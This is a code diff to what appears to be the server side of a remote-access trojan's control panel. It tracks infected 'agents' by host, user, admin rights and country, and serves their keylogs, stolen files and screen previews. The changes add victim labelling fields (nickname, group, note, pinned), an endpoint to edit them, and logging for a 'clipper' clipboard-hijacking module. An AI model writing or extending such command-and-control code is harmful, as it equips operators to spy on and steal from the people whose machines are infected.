@@ -86,7 +86,7 @@ SCHEMA = """
 CREATE TABLE IF NOT EXISTS agents(
   id TEXT PRIMARY KEY, host TEXT, user TEXT, os TEXT, arch TEXT, pid INTEGER,
   admin INTEGER, ip TEXT, first_seen REAL, last_seen REAL, meta TEXT,
-  country TEXT, cc TEXT, note TEXT
+  country TEXT, cc TEXT, note TEXT, nickname TEXT, grp TEXT, pinned INTEGER DEFAULT 0
 );
 CREATE TABLE IF NOT EXISTS commands(
   id TEXT PRIMARY KEY, agent_id TEXT, module TEXT, args TEXT, created REAL,
@@ -116,7 +116,7 @@ def db() -> sqlite3.Connection:
 with db() as _con:
     _con.executescript(SCHEMA)
     have = {r["name"] for r in _con.execute("PRAGMA table_info(agents)")}
-    for col in ("meta", "country", "cc", "note"):
+    for col in ("meta", "country", "cc", "note", "nickname", "grp", "pinned"):
         if col not in have:
             _con.execute(f"ALTER TABLE agents ADD COLUMN {col} TEXT")
     _con.commit()
@@ -243,6 +243,10 @@ def card(aid: str) -> dict | None:
         "ip": row["ip"],
         "cc": row.get("cc") or "",
         "country": row.get("country") or "",
+        "nickname": row.get("nickname") or "",
+        "grp": row.get("grp") or "",
+        "note": row.get("note") or "",
+        "pinned": bool(row.get("pinned")),
         "cpu": meta.get("cpu") or "",
         "ram": meta.get("ram") or 0,
         "gpu": meta.get("gpu") or "",
@@ -326,6 +330,25 @@ async def api_agent(aid: str):
         "files": q("SELECT id,kind,path,name,size,ts FROM files WHERE agent_id=? ORDER BY ts DESC LIMIT 200", (aid,)),
         "keylogs": q("SELECT ts,text FROM keylogs WHERE agent_id=? ORDER BY id DESC LIMIT 400", (aid,)),
     }
+
+
+@app.patch("/api/agents/{aid}/meta", dependencies=[Depends(require_panel)])
+async def api_agent_meta(aid: str, body: dict):
+    if not card(aid):
+        raise HTTPException(404, "no such agent")
+    fields = {}
+    for key in ("nickname", "grp", "note"):
+        if key in body:
+            fields[key] = str(body.get(key) or "")[:200]
+    if "pinned" in body:
+        fields["pinned"] = 1 if body.get("pinned") else 0
+    if not fields:
+        raise HTTPException(400, "nothing to update")
+    sets = ",".join(f"{k}=?" for k in fields)
+    x(f"UPDATE agents SET {sets} WHERE id=?", (*fields.values(), aid))
+    c = card(aid)
+    await pub({"t": "agent", "agent": c})
+    return {"ok": True, "agent": c}
 
 
 @app.get("/api/agents/{aid}/preview.jpg", dependencies=[Depends(require_panel)])
@@ -601,6 +624,10 @@ async def handle_event(sess: AgentSession, msg: dict) -> None:
 
     elif kind == "log":
         await pub({"t": "log", "agent_id": sess.id, "text": str(msg.get("data", ""))[:2000]})
+
+    elif kind == "clipper":
+        await pub({"t": "log", "agent_id": sess.id,
+                   "text": "[clipper] " + str(msg.get("data", ""))[:500]})
 
     elif kind == "progress":
         await pub({"t": "progress", "agent_id": sess.id,
